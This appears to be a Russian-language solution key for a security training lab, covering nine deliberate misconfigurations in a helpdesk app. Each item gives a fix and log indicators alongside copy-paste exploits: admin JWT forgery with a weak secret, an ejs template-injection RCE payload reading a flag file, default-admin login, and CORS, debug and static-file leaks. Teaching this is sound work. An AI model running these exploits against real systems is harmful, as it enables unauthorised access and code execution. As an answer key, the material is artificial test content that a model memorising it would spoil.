# SOLUTION — app1 Helpdesk (только config/deps)

Прикладной код в `apps/app1-helpdesk/src/` **идентичен** для vulnerable и reference.
Все фиксы — в `reference/` (env, `package.json`, Dockerfile, db init, k8s). Флаг-формат:
`TRN{<32 hex>}` (`@hacktraining/shared`). Значения флагов в логи не пишутся.

Команды copy-paste 1:1, `jq` не требуется — извлечение полей на `grep/sed`.

```bash
# Общие переменные. BASE — уязвимый стенд app1.
BASE=http://127.0.0.1:3001
# Сид: admin/admin123 (V1.5), обычный alice/user123.
grepflag(){ grep -oE 'TRN\{[0-9a-f]{32}\}'; }              # извлечь флаг из любого ответа
jval(){ grep -oE "\"$1\":\"?[^\",}]+" | head -1 | sed -E "s/.*:\"?//"; }  # поле JSON без jq
```

---

## V1.1 Слабый JWT-секрет — `CFG-JWT`

- **Где:** `vulnerable/.env` → `JWT_SECRET=secret`
- **Где флаг:** `admin_secrets.value` (name=`round_flag`)
- **Фикс:** длинный случайный `JWT_SECRET` из k8s Secret
- **Логи:** `auth.token.verified` с `role=admin` без предшествующего `auth.login.ok`

```bash
# Подделываем admin-JWT слабым секретом (node из корня репозитория — jsonwebtoken там установлен)
FAKE=$(node -e 'console.log(require("jsonwebtoken").sign({sub:1,username:"admin",role:"admin"},"secret",{expiresIn:"1h"}))')
# С поддельным токеном читаем админ-секреты с флагом
curl -s $BASE/api/admin/secrets -H "Authorization: Bearer $FAKE" | grepflag
```

Шорткат: `node tools/attacker-scripts/app1/forge-jwt.mjs --base $BASE --secret secret`

---

## V1.2 Уязвимый ejs (CVE-2022-29078) — `CFG-RCE`

- **Где:** `vulnerable/package.json` → `ejs@3.1.6`; `GET /tickets/:id` делает `res.render(..., { ...req.query })`
- **Где флаг:** файл `FLAG_FILE_PATH` (`/flags/app1.flag`)
- **Фикс:** `reference/package.json` → `ejs@3.1.10`; исходник не меняется (фикс только в версии зависимости)
- **Логи:** аномальный query / 500 при рендере; значение флага в логи не пишется

```bash
# 1) Логин обычным пользователем и создание своего тикета (нужен :id, которым владеем)
TOKEN=$(curl -s $BASE/api/login -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"user123"}' | jval token)
TID=$(curl -s $BASE/api/tickets -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"title":"probe","body":"probe"}' | jval id)

# 2) На ejs<3.1.7 опция outputFunctionName из query внедряется в компилируемую функцию шаблона.
#    Payload читает файл флага и возвращает его в тело ответа.
PAYLOAD="x;return global.process.mainModule.require('fs').readFileSync(global.process.env.FLAG_FILE_PATH||'/flags/app1.flag','utf8');x"
# %20 в имени параметра обязателен: пробел в ключе иначе ломает разбор query
curl -s -G "$BASE/tickets/$TID" -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "settings[view%20options][outputFunctionName]=$PAYLOAD" | grepflag
```

Шорткат: `node tools/attacker-scripts/app1/ejs-rce.mjs --base $BASE`

---

## V1.3 Debug / утечка стектрейса — `CFG-LEAK`

- **Где:** `EXPOSE_DEBUG=true`, `NODE_ENV=development`
- **Где флаг:** `database.canary_flag` в ответе `/internal/debug`
- **Фикс:** `EXPOSE_DEBUG=false`, `NODE_ENV=production`
- **Логи:** запросы к `/internal/debug`

```bash
# Незащищённый debug-эндпоинт отдаёт конфиг (в т.ч. канареечный флаг и строку подключения к БД)
curl -s $BASE/internal/debug            # весь дамп (в т.ч. канарейка и строка подключения к БД)
curl -s $BASE/internal/debug | grepflag
```

Шорткат: `node tools/attacker-scripts/app1/debug-leak.mjs --base $BASE`

---

## V1.4 CORS `*` + credentials — `CFG-LEAK`

- **Где:** `CORS_ORIGIN=*`, `CORS_CREDENTIALS=true`
- **Фикс:** `CORS_ORIGIN=https://helpdesk.local`
- **Логи:** чужой `Origin` в запросах / preflight `OPTIONS`

```bash
# Сервер отражает любой Origin и разрешает credentials -> чужая страница может читать API с куками жертвы
curl -s -i $BASE/api/tickets -H 'Origin: http://evil.example' -H "Authorization: Bearer $TOKEN" \
  | grep -i 'access-control-allow-'
# vuln: Access-Control-Allow-Origin: http://evil.example  +  Access-Control-Allow-Credentials: true
```

---

## V1.5 Дефолтный админ — `CFG-CREDS`

- **Где:** `SEED_ADMIN_PASSWORD=admin123` → пользователь `admin`
- **Где флаг:** `admin_secrets` (через админку)
- **Фикс:** сильный `SEED_ADMIN_PASSWORD` из Secret + пересев
- **Логи:** `auth.login.ok` для `admin` с внешнего IP

```bash
# Вход дефолтными кредами -> админ-секреты с флагом
ADM=$(curl -s $BASE/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}' | jval token)
curl -s $BASE/api/admin/secrets -H "Authorization: Bearer $ADM" | grepflag
```

Шорткат: `node tools/attacker-scripts/app1/default-admin.mjs --base $BASE`

---

## V1.6 Отключённые security-заголовки — `CFG-LEAK`

- **Где:** `SECURITY_HEADERS=off` (helmet выключен флагом)
- **Фикс:** `SECURITY_HEADERS=on`
- **Логи:** косвенно через checker (`missing_headers`)

```bash
# Проверяем отсутствие CSP/HSTS/X-Frame-Options
curl -s -I $BASE/login | grep -iE 'content-security-policy|strict-transport-security|x-frame-options' \
  || echo "security-заголовки отсутствуют (vuln)"
```

---

## V1.7 [bonus] Postgres trust / NodePort / superuser

- **Где:** `vulnerable/db/pg_hba.conf` = trust; `init.sql` SUPERUSER; Service NodePort
- **Фикс:** `scram-sha-256`, least-privilege роль `helpdesk_app`, `ClusterIP`

## V1.8 [bonus] Контейнер от root / `:latest` / без лимитов

- **Где:** vulnerable Dockerfile `node:latest`, нет `USER`; k8s без securityContext/resources
- **Фикс:** пиннинг тега, `USER app`, `runAsNonRoot`, `drop: [ALL]`, `resources.limits`

## V1.9 [bonus] Утечка статики (корень проекта) — `CFG-LEAK`

- **Где:** `SERVE_STATIC_ROOT=.` — статик-middleware отдаёт корень проекта
- **Фикс:** `SERVE_STATIC_ROOT=./public`

```bash
# Из корня статики утекают исходники/конфиг (в контейнере — /package.json, /src, /tsconfig.json)
curl -s $BASE/package.json | head -n 5
curl -s $BASE/tsconfig.json | head -n 5
```
